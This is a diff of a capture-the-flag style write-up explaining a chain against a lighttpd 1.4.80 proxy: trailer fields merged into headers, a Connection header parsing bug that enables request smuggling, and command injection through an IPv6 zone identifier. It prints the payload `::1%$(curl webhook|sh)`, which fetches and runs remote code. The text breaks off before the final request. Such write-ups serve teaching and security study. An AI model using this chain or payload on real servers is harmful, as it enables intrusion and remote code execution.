@@ -25,15 +25,14 @@ def ping(ip_address: str):
 
 ## Solution
 
-### 1. TR.MRG HTTP Request Smuggling
+### 1. Header smuggling due to trailers merge into headers
 
-Lighttpd 1.4.80 is used as proxy. This version is vulnerable to HTTP Header Smuggling due to trailer fields merge with headers,
-you can find the fix for the vulnerability here: [[core] security: fix to reject disallowed trailers](https://github.com/lighttpd/lighttpd1.4/commit/35cb89c103877de62d6b63d0804255475d77e5e1).
+Lighttpd 1.4.80 is used as proxy. This version is vulnerable to **HTTP Header Smuggling due to trailer fields merge into headers**. This vulnerability allows to overwrite the request headers values after the parsing of the request headers and body. The fix for for it can be found here: [[core] security: fix to reject disallowed trailers](https://github.com/lighttpd/lighttpd1.4/commit/35cb89c103877de62d6b63d0804255475d77e5e1).
 
 the fix commit states that:
 > lighttpd mod_proxy sends Connection: close to backends, so this bug isnot exploitable to send additional requests to backends
 
-To make the bug exploitable we have to exploit another (common) parsing bug in webservers:
+To make the bug exploitable and turn it into a Request Smuggling, another parsing bug has to be exploited:
 
 ### 2. Connection header parsing bug
 
@@ -42,7 +41,9 @@ Many web servers only close a connection when they see the literal header `Conne
 However, [RFC 9110](https://www.rfc-editor.org/rfc/rfc9110#name-connection) allows the `Connection` header to carry multiple, comma-separated options, which must be parsed as independent tokens.
 If the token `close` appears anywhere in that list, the connection **must not persist** (see [RFC 9112](https://www.rfc-editor.org/rfc/rfc9112.html#name-persistence)).
 
-When lighttpd encounters these headers in the trailers:
+---
+
+When lighttpd encounters these headers:
 ```
 TE: trailers
 Upgrade: any
@@ -71,7 +72,7 @@ this gives us enough characters to build a valid IPv6 address that can contain s
  `::1%$(curl webhook|sh)`
 
 
-### Connecting the dots
+### Connecting the dots - TR.MRG HTTP Request Smuggling
 
 Send the following request to lighttpd:
 ```http
